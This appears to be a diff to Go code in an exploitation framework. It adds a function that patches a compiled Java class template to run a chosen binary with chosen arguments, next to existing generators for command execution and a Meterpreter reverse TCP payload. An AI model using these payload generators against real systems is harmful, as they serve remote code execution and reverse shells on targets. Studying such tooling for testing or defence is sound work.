@@ -8,7 +8,7 @@ import (
 	"github.com/pkg/errors"
 )
 
-// GenerateExecute is used to generate class file with execute command.
+// GenerateExecute is used to generate class file for execute command.
 func GenerateExecute(template []byte, command, class string) ([]byte, error) {
 	const (
 		fileNameFlag = "Execute.java"
@@ -70,7 +70,80 @@ func GenerateExecute(template []byte, command, class string) ([]byte, error) {
 	return output.Bytes(), nil
 }
 
-// GenerateReverseTCP is used to generate class file with
+// GenerateSystem is used to generate class file for execute command with arguments .
+func GenerateSystem(template []byte, binary, arguments, class string) ([]byte, error) {
+	const (
+		fileNameFlag = "System.java"
+		binaryFlag   = "${bin}"
+		argumentFlag = "${args}"
+		className    = "System\x01"
+		uint16Size   = 2
+	)
+
+	err := checkJavaClass(template)
+	if err != nil {
+		return nil, err
+	}
+
+	// find three special strings
+	fileNameIdx := bytes.Index(template, []byte(fileNameFlag))
+	if fileNameIdx == -1 {
+		return nil, errors.New("failed to find file name in system template")
+	}
+	binaryIdx := bytes.Index(template, []byte(binaryFlag))
+	if binaryIdx == -1 {
+		return nil, errors.New("failed to find binary flag in system template")
+	}
+	argumentIdx := bytes.Index(template, []byte(argumentFlag))
+	if argumentIdx == -1 {
+		return nil, errors.New("failed to find argument flag in system template")
+	}
+	classNameIdx := bytes.Index(template, []byte(className))
+	if classNameIdx == -1 {
+		return nil, errors.New("failed to find class name in system template")
+	}
+
+	// check arguments
+	if binary == "" {
+		return nil, errors.New("empty binary")
+	}
+	if class == "" {
+		class = "System"
+	}
+
+	// generate output class file
+	output := bytes.NewBuffer(make([]byte, 0, len(template)+128))
+
+	// change file name
+	output.Write(template[:fileNameIdx-uint16Size])
+	fileName := class + ".java"
+	size := beUint16ToBytes(uint16(len(fileName)))
+	output.Write(size)
+	output.WriteString(fileName)
+
+	// change binary
+	output.Write(template[fileNameIdx+len(fileNameFlag) : binaryIdx-uint16Size])
+	size = beUint16ToBytes(uint16(len(binary)))
+	output.Write(size)
+	output.WriteString(binary)
+
+	// change argument
+	output.Write(template[binaryIdx+len(binaryFlag) : argumentIdx-uint16Size])
+	size = beUint16ToBytes(uint16(len(arguments)))
+	output.Write(size)
+	output.WriteString(arguments)
+
+	// change class name
+	output.Write(template[argumentIdx+len(argumentFlag) : classNameIdx-uint16Size])
+	size = beUint16ToBytes(uint16(len(class)))
+	output.Write(size)
+	output.WriteString(class)
+
+	output.Write(template[classNameIdx+len(className)-1:])
+	return output.Bytes(), nil
+}
+
+// GenerateReverseTCP is used to generate class file for
 // meterpreter: payload/java/meterpreter/reverse_tcp.
 func GenerateReverseTCP(template []byte, host string, port uint16, token, class string) ([]byte, error) {
 	const (
